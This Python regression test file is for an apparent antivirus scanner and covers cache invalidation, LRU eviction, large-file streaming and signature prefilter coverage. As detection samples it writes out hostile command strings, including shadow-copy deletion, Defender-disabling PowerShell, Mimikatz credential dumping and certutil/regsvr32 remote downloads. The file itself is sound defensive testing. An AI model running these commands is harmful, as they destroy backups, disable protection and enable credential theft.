"""
Regression Tests for SentinelCore Scanner Hardening
Verifies reputation cache invalidation on signature updates, true LRU eviction,
and full-file signature coverage beyond the 2MB head window.
"""

import contextlib
import os
import re
import sys
import tempfile
import gc
import shutil

sys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), "..")))
from sentinel_scanner import engine
from sentinel_scanner.engine import SentinelScanner, VERDICT_ALLOW, VERDICT_QUARANTINE

SHADOW_DELETE = b"vssadmin.exe delete shadows /all /quiet"

def test_signature_update_invalidates_cached_clean_verdict():
    temp_dir = tempfile.mkdtemp()
    original_patterns = list(engine.THREAT_PATTERNS)
    try:
        db_path = os.path.join(temp_dir, "test_rep.db")
        sample = b"benign looking installer with NEWFAMILY-BEACON-7731 inside"

        # Scanned before the signature exists -> cached as clean
        scanner = SentinelScanner(db_path=db_path)
        assert scanner.scan_bytes(sample).verdict == VERDICT_ALLOW
        assert scanner.scan_bytes(sample).tier == 1
        del scanner
        gc.collect()

        # Definitions update ships a signature for it
        engine.THREAT_PATTERNS.append((re.compile(rb"NEWFAMILY-BEACON-\d{4}"), "Trojan.NewFamilyBeacon"))

        scanner = SentinelScanner(db_path=db_path)
        v = scanner.scan_bytes(sample)
        assert v.verdict == VERDICT_QUARANTINE, f"stale clean verdict served from cache: {v}"
        assert "NewFamilyBeacon" in v.reason

        print("[+] test_signature_update_invalidates_cached_clean_verdict: PASSED")
    finally:
        engine.THREAT_PATTERNS[:] = original_patterns
        scanner = None
        gc.collect()
        shutil.rmtree(temp_dir, ignore_errors=True)

def test_cache_survives_restart_when_signatures_unchanged():
    temp_dir = tempfile.mkdtemp()
    try:
        db_path = os.path.join(temp_dir, "test_rep.db")
        sample = b"plain text file with nothing interesting in it"

        scanner = SentinelScanner(db_path=db_path)
        assert scanner.scan_bytes(sample).tier == 3
        del scanner
        gc.collect()

        scanner = SentinelScanner(db_path=db_path)
        v = scanner.scan_bytes(sample)
        assert v.verdict == VERDICT_ALLOW
        assert v.tier == 1, "warm cache was dropped although signatures did not change"

        print("[+] test_cache_survives_restart_when_signatures_unchanged: PASSED")
    finally:
        scanner = None
        gc.collect()
        shutil.rmtree(temp_dir, ignore_errors=True)

def test_cache_evicts_least_recently_used():
    temp_dir = tempfile.mkdtemp()
    try:
        scanner = SentinelScanner(db_path=os.path.join(temp_dir, "test_rep.db"))
        scanner.cache_capacity = 2

        first, second, third = b"sample-one", b"sample-two", b"sample-three"
        scanner.scan_bytes(first)
        scanner.scan_bytes(second)
        scanner.scan_bytes(first)   # touch: `first` is now the most recently used
        scanner.scan_bytes(third)   # over capacity -> `second` must go, not `first`

        assert scanner.scan_bytes(first).tier == 1
        assert scanner.scan_bytes(second).tier == 3

        print("[+] test_cache_evicts_least_recently_used: PASSED")
    finally:
        scanner = None
        gc.collect()
        shutil.rmtree(temp_dir, ignore_errors=True)

def test_signature_past_head_window_is_detected():
    temp_dir = tempfile.mkdtemp()
    try:
        scanner = SentinelScanner(db_path=os.path.join(temp_dir, "test_rep.db"))

        # Payload parked behind 3MB of padding, past the old 2MB scan window
        padded = b"A" * (3 * 1024 * 1024) + SHADOW_DELETE
        v = scanner.scan_bytes(padded)
        assert v.verdict == VERDICT_QUARANTINE, f"padded payload evaded the scanner: {v}"
        assert "ShadowCopyDelete" in v.reason

        print("[+] test_signature_past_head_window_is_detected: PASSED")
    finally:
        scanner = None
        gc.collect()
        shutil.rmtree(temp_dir, ignore_errors=True)

def test_large_file_is_scanned_end_to_end():
    temp_dir = tempfile.mkdtemp()
    try:
        scanner = SentinelScanner(db_path=os.path.join(temp_dir, "test_rep.db"))
        chunk = engine.STREAM_CHUNK_SIZE

        # Streamed path (> 20MB). The payload straddles a chunk boundary so that
        # a scanner matching chunk-by-chunk without overlap would miss it.
        split_at = len(SHADOW_DELETE) // 2
        big_file = os.path.join(temp_dir, "installer.bin")
        with open(big_file, "wb") as f:
            f.write(b"A" * (chunk * 3 - split_at))
            f.write(SHADOW_DELETE)
            f.write(b"A" * (engine.IN_MEMORY_SCAN_LIMIT - chunk * 2))

        assert os.path.getsize(big_file) > engine.IN_MEMORY_SCAN_LIMIT
        v = scanner.scan_file(big_file)
        assert v.verdict == VERDICT_QUARANTINE, f"large-file payload evaded the scanner: {v}"
        assert "ShadowCopyDelete" in v.reason
        assert len(v.sha256) == 64

        # Same file again -> answered from the reputation cache
        assert scanner.scan_file(big_file).tier == 1

        # A clean large file stays clean
        clean_file = os.path.join(temp_dir, "clean.bin")
        with open(clean_file, "wb") as f:
            f.write(b"B" * (engine.IN_MEMORY_SCAN_LIMIT + chunk))
        assert scanner.scan_file(clean_file).verdict == VERDICT_ALLOW

        print("[+] test_large_file_is_scanned_end_to_end: PASSED")
    finally:
        scanner = None
        gc.collect()
        shutil.rmtree(temp_dir, ignore_errors=True)

def test_reputation_db_from_older_version_is_migrated():
    import sqlite3
    temp_dir = tempfile.mkdtemp()
    try:
        db_path = os.path.join(temp_dir, "test_rep.db")
        sample = b"file cached by a build that had no signature versioning"
        stale_hash = __import__("hashlib").sha256(sample + SHADOW_DELETE).hexdigest()

        # Schema written by the previous release: no sig_version column, and a
        # clean verdict recorded for a file the current signatures do catch.
        with sqlite3.connect(db_path) as conn:
            conn.execute("""
                CREATE TABLE reputation_cache (
                    sha256 TEXT PRIMARY KEY,
                    verdict INTEGER NOT NULL,
                    reason TEXT NOT NULL,
                    first_seen TEXT NOT NULL
                )
            """)
            conn.execute("INSERT INTO reputation_cache VALUES (?, ?, ?, ?)",
                         (stale_hash, VERDICT_ALLOW, "Tier3:CleanBinary", "2026-01-01 00:00:00"))
            conn.commit()
        conn.close()

        scanner = SentinelScanner(db_path=db_path)
        v = scanner.scan_bytes(sample + SHADOW_DELETE)
        assert v.verdict == VERDICT_QUARANTINE, f"unversioned legacy verdict was trusted: {v}"

        # The schema was upgraded in place and the unversioned row is gone
        with contextlib.closing(sqlite3.connect(db_path)) as conn:
            columns = {row[1] for row in conn.execute("PRAGMA table_info(reputation_cache)")}
            versions = {row[0] for row in conn.execute("SELECT sig_version FROM reputation_cache")}
        assert "sig_version" in columns
        assert versions == {scanner.sig_version}, f"stale rows left behind: {versions}"

        # A second scanner on the already-migrated DB starts without error
        assert SentinelScanner(db_path=db_path).scan_bytes(sample + SHADOW_DELETE).tier == 1

        print("[+] test_reputation_db_from_older_version_is_migrated: PASSED")
    finally:
        scanner = None
        gc.collect()
        shutil.rmtree(temp_dir, ignore_errors=True)

# One sample per signature, with letter case varied on the case-insensitive ones.
# The anchor prefilter must never hide a sample its regex would have matched.
SIGNATURE_SAMPLES = {
    "EICAR.StandardTestVirus": b"X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*",
    "Ransomware.ShadowCopyDelete": b"VSSAdmin Delete Shadows /all",
    "Ransomware.WmicShadowDelete": b"WMIC.exe ShadowCopy delete",
    "Ransomware.WbadminDeleteCatalog": b"WBAdmin delete catalog -quiet",
    "Ransomware.BcdeditTamper": b"BCDEdit /set {default} recoveryenabled No",
    "DefenseEvasion.DisableDefender": b"set-mppreference -disablerealtimemonitoring $true",
    "DefenseEvasion.DefenderExclusion": b"ADD-MPPREFERENCE -ExclusionPath C:\\Temp",
    "Hacktool.Mimikatz": b"SEKURLSA::LogonPasswords",
    "Hacktool.MimikatzLsa": b"LSADump::SAM",
    "Malware.ObfuscatedPowerShell": b"PowerShell.EXE -Enc " + b"QUJD" * 12,
    "LOLBin.CertutilDownload": b"CertUtil -urlcache -f http://203.0.113.9/a.exe a.exe",
    "LOLBin.BitsadminTransfer": b"BITSAdmin /transfer job http://203.0.113.9/a.exe",
    "LOLBin.MshtaExecution": b"MSHTA javascript:close()",
    "LOLBin.SquiblydooRegsvr32": b"RegSvr32 /s /u /i:http://203.0.113.9/a.sct scrobj.dll",
    "DefenseEvasion.SuspiciousOrdinal": b"RunDLL32 shell32.dll,#1",
    "Ransomware.RansomNoteText": b"All Your Files Have Been Encrypted",
    "Ransomware.PersonalIdHeader": b"Your Personal ID Is: ABCDEF0123456789",
    "Cryptominer.StratumPool": b"STRATUM+TCP://pool.example.com:3333",
    "Hacktool.MetasploitPayload": b"windows/x64/shell/BIND_TCP",
    "Hacktool.CobaltStrikeNamedPipe": b"\\\\.\\PIPE\\MSSE-1234-server",
}

def test_every_signature_survives_the_anchor_prefilter():
    signature_names = {name for _, name in engine.THREAT_PATTERNS}

    assert set(SIGNATURE_SAMPLES) == signature_names, "every signature needs exactly one sample here"
    assert set(engine.SIGNATURE_ANCHORS) <= signature_names, "anchor registered for an unknown signature"

    for sig_name, sample in SIGNATURE_SAMPLES.items():
        assert engine.find_signature(sample) == sig_name, f"{sig_name} missed its own sample"
        # Same sample buried mid-buffer, as it would sit inside a real file
        assert engine.find_signature(b"\x00" * 4096 + sample + b"\x00" * 4096) == sig_name

    assert engine.find_signature(b"an ordinary sentence about certificates and power tools") is None

    # The buffer is lowercased before the substring test, so an anchor holding an
    # uppercase byte could never be found and would silence its signature.
    for sig_name, anchors in engine.SIGNATURE_ANCHORS.items():
        for anchor in anchors:
            assert anchor == anchor.lower(), f"{sig_name} anchor {anchor!r} is not lowercase"

    # Signatures with several alternatives need each one reachable through its own anchor
    for variant in (b"windows/Meterpreter/x", b"shell/REVERSE_TCP", b"shell/Reverse_HTTPS", b"shell/bind_tcp"):
        assert engine.find_signature(variant) == "Hacktool.MetasploitPayload", f"{variant!r} missed"

    print(f"[+] test_every_signature_survives_the_anchor_prefilter: PASSED ({len(SIGNATURE_SAMPLES)} signatures)")

def test_crafted_repetition_does_not_stall_signature_matching():
    import time

    # Each keyword starts a signature with an open-ended gap. Repeating it used to
    # cost quadratic time: 64KB of `bcdedit ` took several seconds.
    for keyword in (b"bcdedit ", b"certutil ", b"regsvr32 ", b"rundll32 "):
        crafted = keyword * 8000
        t0 = time.perf_counter()
        assert engine.find_signature(crafted) is None
        elapsed = time.perf_counter() - t0
        assert elapsed < 1.0, f"{keyword!r} repetition stalled matching for {elapsed:.2f}s"

    # The gap bound must not cost real detections
    assert engine.find_signature(b"bcdedit.exe /set {default} bootstatuspolicy ignoreallfailures") == "Ransomware.BcdeditTamper"
    assert engine.find_signature(b"certutil.exe -urlcache -split -f http://203.0.113.9/a.exe") == "LOLBin.CertutilDownload"

    print("[+] test_crafted_repetition_does_not_stall_signature_matching: PASSED")

def test_streamed_match_with_wide_gap_across_first_chunk_boundary():
    temp_dir = tempfile.mkdtemp()
    try:
        scanner = SentinelScanner(db_path=os.path.join(temp_dir, "test_rep.db"))
        chunk = engine.STREAM_CHUNK_SIZE

        # 5000 spaces between the two halves of the command, placed so the first
        # chunk ends inside the gap. A command line cannot be longer than 32,767
        # characters, so the carry-over has to cover at least that much.
        assert engine.STREAM_OVERLAP >= 32767
        big_file = os.path.join(temp_dir, "installer.bin")
        with open(big_file, "wb") as f:
            f.write(b"A" * (chunk - 4500))
            f.write(b"vssadmin.exe" + b" " * 5000 + b"delete shadows")
            f.write(b"A" * engine.IN_MEMORY_SCAN_LIMIT)

        v = scanner.scan_file(big_file)
        assert v.verdict == VERDICT_QUARANTINE, f"gap across the chunk boundary evaded the scanner: {v}"
        assert "ShadowCopyDelete" in v.reason

        print("[+] test_streamed_match_with_wide_gap_across_first_chunk_boundary: PASSED")
    finally:
        scanner = None
        gc.collect()
        shutil.rmtree(temp_dir, ignore_errors=True)

if __name__ == "__main__":
    test_every_signature_survives_the_anchor_prefilter()
    test_crafted_repetition_does_not_stall_signature_matching()
    test_streamed_match_with_wide_gap_across_first_chunk_boundary()
    test_signature_update_invalidates_cached_clean_verdict()
    test_cache_survives_restart_when_signatures_unchanged()
    test_cache_evicts_least_recently_used()
    test_signature_past_head_window_is_detected()
    test_large_file_is_scanned_end_to_end()
    test_reputation_db_from_older_version_is_migrated()
